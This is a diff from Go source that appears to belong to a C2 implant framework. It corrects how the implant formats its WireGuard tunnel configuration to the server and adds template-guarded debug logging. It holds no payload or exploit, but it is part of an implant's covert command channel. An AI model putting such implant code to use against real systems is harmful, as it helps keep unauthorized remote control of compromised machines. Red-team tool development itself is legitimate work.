@@ -131,14 +131,21 @@ func wgSocketConnect(address string, port uint16) (net.Conn, *device.Device, err
 		[]net.IP{net.ParseIP("127.0.0.1")},
 		1420)
 	if err != nil {
+		// {{if .Config.Debug}}
 		log.Panic(err)
+		// {{end}}
 	}
+
 	dev := device.NewDevice(tun, conn.NewDefaultBind(), device.NewLogger(device.LogLevelVerbose, "[c2/wg] "))
 	wgConf := bytes.NewBuffer(nil)
 	fmt.Fprintf(wgConf, "private_key=%s\n", wgImplantPrivKey)
 	fmt.Fprintf(wgConf, "public_key=%s\n", wgServerPubKey)
-	fmt.Fprintf(wgConf, "endpoint=%s:\n", address, port)
-	fmt.Fprintf(wgConf, "allowed_ip=%s/32\n", "0.0.0.0/0")
+	fmt.Fprintf(wgConf, "endpoint=%s:%d\n", address, port)
+	fmt.Fprintf(wgConf, "allowed_ip=%s/0\n", "0.0.0.0")
+
+	// {{if .Config.Debug}}
+	log.Printf("Server WG config: %s", wgConf.String())
+	// {{end}}
 
 	if err := dev.IpcSetOperation(bufio.NewReader(wgConf)); err != nil {
 		return nil, nil, err
